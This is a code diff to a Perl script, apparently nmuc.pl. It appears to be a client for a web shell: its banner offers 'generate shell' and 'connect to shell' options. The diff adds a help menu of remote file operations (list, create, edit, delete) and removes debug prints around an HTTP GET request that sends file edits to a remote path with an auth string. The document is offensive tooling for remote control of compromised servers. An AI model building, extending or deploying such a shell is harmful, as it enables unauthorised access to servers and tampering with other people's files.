@@ -10,6 +10,18 @@ $code="deffy0h";
 my $OK_HTTP=200;
 my $RE_ERRO="ERRO0";
 
+my $help=
+"
+\t\tdir - files and folders\n
+\t\tmkdir - create folder\n
+\t\topen - save file\n
+\t\tdel - delete file or folder\n
+\t\tedit - edit a file\n
+\t\tcreate - create a file\n
+\t\tcls - clear terminal\n
+\t\texit - exit terminal\n
+";
+
 print <<Eop;
 
 
@@ -29,6 +41,7 @@ print <<Eop;
 		
 		use: nmuc.pl -op 'CONN' -connect to shell
 		use: nmuc.pl -op 'CREN' -generate shell
+		use: nmuc.pl -help -get help
 		
 Eop
 
@@ -40,8 +53,15 @@ my $path="";
 my $lastFolder="";
 my $lj="";
 my $hem="";
+my $h;
 
-GetOptions("opt=s"=>\$op);
+GetOptions("opt=s"=>\$op,"help"=>\$h);
+
+unless($h){
+}else{
+print $help;
+exit;
+}
 
 unless($op){
 print "\n[-] OPTION\n\n";
@@ -284,9 +304,6 @@ $hem=<STDIN>;
 chomp($hem);
 
 $gh=$auth."&type=edit&path=".$path."&text=".$hem;
-
-print $gh."\n";
-print $hem;
 
 if($re=HTTP::Request->new(GET=>$gh)){
 $response=$ua->request($re);
